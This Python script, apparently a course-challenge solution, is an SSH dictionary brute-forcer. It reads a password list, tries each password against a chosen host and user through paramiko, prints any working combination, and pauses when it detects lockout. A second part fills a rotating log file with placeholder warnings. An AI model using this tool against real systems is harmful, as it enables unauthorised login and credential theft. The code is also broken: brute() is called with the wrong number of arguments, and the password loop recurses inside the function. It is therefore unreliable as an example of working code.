#!/usr/bin/python3

# Script: Ops 401d5 Ops Challenge Solution 27
# Author: Jon Salhus                  
# Date of latest revision: 11/7/2022
# Purpose: 

import logging
from logging.handlers import RotatingFileHandler
import paramiko
import socket
import time
from colorama import init, Fore

init()

GREEN = Fore.GREEN
RED   = Fore.RED
RESET = Fore.RESET
BLUE  = Fore.BLUE

plist = input("Enter the filename of your dictionary.\n")
f = open(plist, 'r')

hostname = input("Enter the IP address or host name.\n")
username = input("Enter the user name.\n")
password = input("Enter a password.\n")
ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

def brute(password):
    try:
        ssh.connect(hostname=hostname, username=username, password=password, timeout=3)
    except socket.timeout:
        print(f"{RED}[!] Host: {hostname} is unreachable, timed out.{RESET}")
    except paramiko.AuthenticationException:
        print(f"[!] Invalid credentials for {username}:{password}")
    except paramiko.SSHException:
        print(f"{BLUE}[*] Attack detected, sleeping...{RESET}")
        time.sleep(60)
        return brute(hostname, username, password)
    else:
        print(f"{GREEN}[+] Found combo:\n\tHOSTNAME: {hostname}\n\tUSERNAME: {username}\n\tPASSWORD: {password}{RESET}")
        exit(0)
    for password in f:
        brute(password.rstrip())

# MAIN FOR LOGS
logs = logging.getLogger('test_logger')
logs.setLevel(logging.INFO)
handler = RotatingFileHandler('testlog2.log', maxBytes=100, backupCount=5)
formatter = logging.Formatter('%(asctime)s:%(levelname)s:%(message)s')
handler.setFormatter(formatter)
logs.addHandler(handler)
print('Logging initialized.')

for i in range(200):
    logmsg = "Warning: Script is running but should be checked"
    logmsg += str(i)
    logs.warning(logmsg)
    logs.info('Info: Script is running.')
    logs.critical('Critical: Issue encountered!')
    logs.error('Error: Script has stopped functioning properly.')

try:
    brute()
except Exception as msg:
    print(msg)
    logging.exception(msg)

print('Logging complete.')